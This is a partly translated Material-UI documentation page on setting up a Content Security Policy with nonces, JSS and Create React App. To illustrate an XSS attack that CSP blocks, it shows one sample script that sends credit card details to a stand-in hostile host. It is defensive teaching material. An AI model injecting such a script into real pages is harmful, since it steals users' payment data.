# Política de segurança de conteúdo (CSP)

<p class="description">This section covers the details of setting up a CSP.</p>

## O que é CSP e por que é útil?

CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. Esta lista é retornada como um cabeçalho do servidor. Por exemplo, digamos que você tenha um site hospedado em `https://example.com` o cabeçalho CSP `default-src: 'self';` permitirá todos os assets localizados em `https://example.com/*` e negar todos os outros. Se houver uma seção do seu site que é vulnerável ao XSS, onde a entrada do usuário de unescaped é exibida, um invasor pode inserir algo como:

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

Esta vulnerabilidade permitiria que o invasor executasse qualquer coisa. No entanto, com um cabeçalho CSP seguro, o navegador não carregará esse script.

Você pode ler mais sobre o CSP no [MDN Web Docs](https://developer.mozilla.org/pt-BR/docs/Web/HTTP/CSP).

## Como se implementa o CSP?

### Server-Side Rendering (SSR)

To use CSP with Material-UI (and JSS), you need to use a nonce. Um nonce é uma string gerada aleatoriamente que é usada apenas uma vez, portanto, você precisa adicionar um middleware de servidor para gerar um em cada solicitação. JSS tem um [ótimo tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) sobre como conseguir isso com Express and React Helmet. Para um resumo básico, continue lendo.

Um nonce CSP é uma string codificada na Base 64. Você pode gerar um assim:

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

You must use UUID version 4, as it generates an **unpredictable** string. Em seguida, você aplica esse nonce ao cabeçalho do CSP. Um cabeçalho CSP pode ser assim com o nonce aplicado:

```js
header('Content-Security-Policy').set(
  `default-src 'self'; style-src: 'self' 'nonce-${nonce}';`,
);
```

You should pass the nonce in the `<style>` tag on the server.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{
    __html: sheets.toString(),
  }}
/>
```

Então, você deve passar este nonce para o JSS para que ele possa adicioná-lo às tags `<style>` subsequentes.

A maneira como você faz isso é passando uma tag `<meta property="csp-nonce" content={nonce} />` no `<head>` do seu HTML. O JSS irá então, por convenção, procurar por uma tag `<meta property="csp-nonce"` e usar o valor do `content` como um nonce.

Aqui está um exemplo de como um cabeçalho fictício poderia parecer:

```html
<head>
  <meta property="csp-nonce" content="this-is-a-nonce-123" />
</head>
```

### Create React App (CRA)

According to the [Create React App Docs](https://create-react-app.dev/docs/advanced-configuration/), a Create React App will dynamically embed the runtime script into index.html during the production build by default. This will require a new hash to be set in your CSP during each deployment.

To use a CSP with a project initialized as a Create React App, you will need to set the `INLINE_RUNTIME_CHUNK=false` variable in the `.env` file used for your production build. This will import the runtime script as usual instead of embedding it, avoiding the need to set a new hash during each deployment.
